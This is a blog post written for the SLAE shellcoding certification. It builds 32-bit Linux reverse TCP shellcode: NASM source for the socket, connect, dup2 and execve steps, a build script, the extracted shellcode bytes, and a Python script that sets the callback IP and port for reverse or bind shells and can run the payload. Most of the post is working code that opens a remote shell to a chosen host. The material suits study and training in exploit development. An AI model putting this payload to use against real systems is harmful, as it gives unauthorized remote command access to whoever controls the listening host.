---
layout: single
title: SLAE Assignment 2 - Shell Reverse Tcp
date: 2020-5-01
classes: wide
header:
  teaser: /assets/images/slae/SHELLCODING32.png
tags:
    - Shellcoding
    - Linux
    - x86
    - SLAE
---

![](/assets/images/slae/SHELLCODING32.png)

## Introduction
Here is the second post of the SLAE exam assignments series.  

This assignement is to create a a shell_reverse_tcp shellcode that connect to an ip and port and execs shell.  
The ip address and port number should be easily configurable.

All the source code for this assignment can be find on my [github repository](https://github.com/skr0x/SLAE/tree/master/Assignment-02-Shell_reverse_tcp)

## Shellcode overview

Because bind shell and reverse shell are very similar, a big part of this post is almost identical to my previous post on the [shell bind tcp assignment](http://skrox.fr/SLAE-Assignment-1-Shell-Bind-Tcp/). 

### The reverse 

To connect to an host, we need to follow those steps :

 - first we need to create a socket with the desired properties (here an IPv4, TCP socket)
 - then connect to a specified address and port

We have two ways to do this : 
- Using the socket and connect syscalls 
- Or using the socketcall syscall 

In the following, we will use the socketcall syscall.

### And the shell

Once the connection is established, we need to redirect the standards i/o streams to it to be able to interact with the shell we will be executing.  
To do so we need to duplicate the socket file descriptor and overwrite the stdin(0), stdout(1) and stderr(2) files descriptor, using dup2 syscall.

Then we can run our shell using the execve syscall.

## The assembly code

*A list of prototypes, associated headers files and manpages, special variables etc... that will be used to complete this assignment, can be find at the bottom of this post.*

**This shellcode will be Null byte free only if the ip address and port don't contain Null bytes**

### Create a socket

We need to use the socketcall with SYS_SOCKET in EBX and ECX pointing to the socket function arguments on the stack.  
These arguments need to be AF_INET, SOCK_STREAM and 0.  

A socket file descriptor will be returned in EAX, we will save it in EDI for later use.

```nasm
;socket(AF_INET, SOCK_STREAM, 0)
;socketcall(SYS_SOCKET, *socket_args)
    xor ebx, ebx        ; set ebx to 0
    mul ebx             ; set eax and edx to 0

    push ebx            ; 0 for the protocol argument
    inc ebx
    push ebx            ; SOCK_STREAM
    push byte 0x2       ; AF_INET

    mov ecx, esp        ; ecx points to the socket's arguments
    add al, 0x66        ; socketcall 
    int 0x80
    
    xchg edi, eax       ; we save the sockfd returned by socket to edi 
                        ; (xchg is one byte opcode, so best than mov(2 bytes) 
                        ; because we dont care about eax value)
```

### Connect to the remote host

We push the sockaddr structure on the stack, 
with values AF_INET, 0x3905 for port 1337 and 0x0100007f for ip address 127.0.0.1, and we save the address in ECX.

Next we need a pointer to the connect function's arguments, so we push sockfd (in EDI), the address of the sockaddr structure (in ECX) and the addrlen value 0x10
then we copy the stack address in ECX for the socketcall call and we set EBX to SYS_CONNECT and EAX to the socketcall value.

On success, return 0 in EAX

```nasm
;sockaddr{AF_INET, port, INADDR_ANY}
;connect(sockfd, *sockaddr, addrlen)
;socketcall(3, *args)
;return 0 if success
    pop ebx             ; ebx set to SYS_BIND 
                        ; 2 was the last value pushed on the stack
      
    push  0x0100007f    ; ip   127.0.0.1
    push  word 0x3905   ; port 1337
    push  bx            ; AF_INET
    mov ecx, esp        ; ecx point to the sockaddr struct

    push   0x10         ; sockaddr struct length
    push   ecx          ; address to the sockaddr struct
    push   edi          ; sockfd previously saved

    mov    ecx,esp      ; ecx points to the connect's arguments

    inc ebx             ; 3 for SYS_CONNECT

    push 0x66           ; socketcall
    pop eax
    int 0x80

```

### Overwrite standard I/O

Here we need to overwrite all standards I/O with the socketfd.  
So we make a loop to make three dup2 call with the values of stderr (2), stdout (1), stdin (0),  
In this order so at the end we have ECX set to 0, and that will be usefull to gain some bytes for our shellcode length.

On success, return the new file descriptor in EAX (so 0 on the last call)

```nasm
;dup2(sockfd, stderr)
;dup2(sockfd, stdout)
;dup2(sockfd, stdin])
    xchg ecx, ebx       ; ecx set to 3
    xchg ebx, edi       ; set ebx to sockfd 
link:
    dec    ecx          ; set ecx from 2 to 0 (stderr to stdin)
    mov    al,0x3f      ; dup2 syscall value
    int    0x80
    jne    link         ; if ecx not equal to stdin, overwrite next standard i/o
```

### Pop a shell

We push the "/bin//sh" string on the stack without forgetting the null byte, and we copy the address in EBX.  
ECX and EDX are already set null point (0x00) so we can make an execve call.

We don't care about a proper exit so we are done. 

```nasm
;execve("/bin//sh", NULL, NULL) 

    push   eax          ; string terminator 0x00
    push   0x68732f2f   ; push /bin//sh in reverse order
    push   0x6e69622f
    mov    ebx,esp      ; ebx point to /bin//sh
                        ; ecx and edx already set to 0x00 (Null pointer)
    mov    al,0xb       ; execve syscall number
    int    0x80
```

## Customise the port and exec the shellcode

Now we will compile and generate the shellcode using this script (I've done a little update on the string output since the last post) :

```bash
#!/bin/bash

printf "[x] Assembling...\n"
nasm -f elf32 $1.nasm -o $1.o

printf "[x] Linking...\n"
ld $1.o -o $1

printf "[x] Done !\n\n"

printf "Shellcode : \n"
objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|grep -v 'format'|cut -f2 -d:|cut -f1-6 -d' '|  
tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

```plaintext
root@kali:~# ./compile.sh shell-reverse-tcp
[x] Assembling...
[x] Linking...
[x] Done !

Shellcode : 
"\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\x04\\x66\\xcd\\x80\\x97\\x5b\\x68\\x7f\\x00\\x00\\x01
\\x66\\x68\\x05\\x39\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\x43\\x6a\\x66\\x58\\xcd\\x80\\x87\\xcb
\\x87\\xdf\\x49\\xb0\\x3f\\xcd\\x80\\x75\\xf9\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3
\\xb0\\x0b\\xcd\\x80"
```

Next to customise the ip address and port, we will integrate this shellcode into a python script (updated too) :

```python
#!/usr/bin/python3

# Demey Alexandre
# 2020-05-01
# PA-14186

from ctypes import CDLL, CFUNCTYPE, c_char_p, cast
from sys import argv
import argparse
from ipaddress import ip_address, AddressValueError

#Default port
port = 1337
#Default ip address
ip = "127.0.0.1"


# Setting the arguments
parser = argparse.ArgumentParser()
parser.add_argument("-e", "--exec",
                    help="If set, the shellcode is printed to the screen then executed",
                    action="store_true")
parser.add_argument("-i", "--ip",
                    help="Change the ip address (Default:127.0.0.1) --ignored if bind type--")
parser.add_argument("-p", "--port", type=int,
                    help="Change the port (Default:1337)")
parser.add_argument("type", choices=["bind_tcp","reverse_tcp"],
                    help="Type of the shellcode")
args = parser.parse_args()

# Available shellcodes
shellcodes = { 
              'bind_tcp': "\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\x04\\x66\\xcd\\x80"\
                          "\\x97\\x5b\\x52\\x66\\x68{}\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89"\
                          "\\xe1\\x6a\\x66\\x58\\xcd\\x80\\x52\\x57\\x89\\xe1\\xd1\\xe3\\xb0\\x66\\xcd"\
                          "\\x80\\x52\\x52\\x57\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\\x93\\x6a\\x03\\x59"\
                          "\\x49\\xb0\\x3f\\xcd\\x80\\x75\\xf9\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f"\
                          "\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80",

              'reverse_tcp': "\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\x04\\x66\\xcd"\
                             "\\x80\\x97\\x5b\\x68{}\\x66\\x68{}\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51"\
                             "\\x57\\x89\\xe1\\x43\\x6a\\x66\\x58\\xcd\\x80\\x87\\xcb\\x87\\xdf\\x49"\
                             "\\xb0\\x3f\\xcd\\x80\\x75\\xf9\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f"\
                             "\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80"}

# Change ip address if the ip argument is set
if args.ip:
    ip = args.ip

#Format the ip address
try:
    ip = "{0:0{1}x}".format(int(ip_address(ip)), 8)
    ip = "\\x" + ip[:2] + "\\x" + ip[2:4] + "\\x" + ip[4:6] + "\\x" + ip[6:] 
except AddressValueError:
    print("Invalid IP address")

# Change port number if the port argument is set and valid
if args.port and args.port > 0 and args.port <= 65535:
    port = args.port

# Format the port 
port = "{0:0{1}x}".format(port,4)
port = "\\x" + port[:2] + "\\x" + port[2:]

# Set ip / port where necessary
shellcode_str = ""
if args.type == "bind_tcp":
    shellcode_str = shellcodes[args.type].format(port)
elif args.type == "reverse_tcp":
    shellcode_str = shellcodes[args.type].format(ip,port)

# Print the shellcode and his size
shellcode_bytes = bytes.fromhex(shellcode_str.replace('\\x',''))
print("Shellcode size : {}".format(len(shellcode_bytes)))
print('"{}"'.format(shellcode_str))

# If arg exec is set, execute the shellcode
if args.exec :
    libc = CDLL("libc.so.6")

    c_shell_p = c_char_p(shellcode_bytes)

    launch = cast(c_shell_p, CFUNCTYPE(c_char_p))

    launch()
```

Then we can use the script to change the default ip address, the default port and execute directly the shellcode :

![netcat-connection](/assets/images/slae/reverse_tcp.png)

### Ressources 

```c
#man socketcall
int socketcall(int call, unsigned long *args);
```

```c
#man socket
int socket(int domain, int type, int protocol);
```

```c
#man 2 connect
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```

```c
#man dup2
int dup2(int oldfd, int newfd);
```

```c
#man execve
int execve(const char *filename, char *const argv[], char *const envp[]);
```

```c
#man 7 ip
struct sockaddr_in {
               sa_family_t    sin_family; /* address family: AF_INET */
               in_port_t      sin_port;   /* port in network byte order */
               struct in_addr sin_addr;   /* internet address */
           };
```

```c
#/usr/include/asm/unistd_32.h
#define __NR_execve 11
#define __NR_dup2 63
#define __NR_socketcall 102
```

```c
#/usr/include/linux/net.h
#define SYS_SOCKET	1		/* sys_socket(2)		*/
#define SYS_CONNECT	3		/* sys_connect(2)		*/
```

```c
# cat /usr/include/bits/socket_type.h
  SOCK_STREAM = 1,		/* Sequenced, reliable, connection-based
#define SOCK_STREAM SOCK_STREAM
```

```c
#/usr/include/bits/socket.h
#define PF_INET		2	/* IP protocol family.  */
#define AF_INET		PF_INET
```

***This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)  
Student ID: PA-14186***
